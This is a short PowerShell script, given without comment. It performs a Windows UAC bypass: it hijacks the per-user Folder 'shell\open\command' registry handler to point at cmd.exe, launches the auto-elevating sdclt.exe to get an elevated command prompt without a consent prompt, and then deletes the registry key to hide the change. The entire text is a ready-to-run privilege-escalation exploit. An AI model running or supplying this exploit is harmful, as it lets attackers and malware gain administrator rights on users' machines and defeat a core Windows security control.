New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value cmd.exe -Force
Start-Sleep -s 1
Start-Process "C:\Windows\System32\sdclt.exe"
Start-Sleep -s 1
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Recurse -Force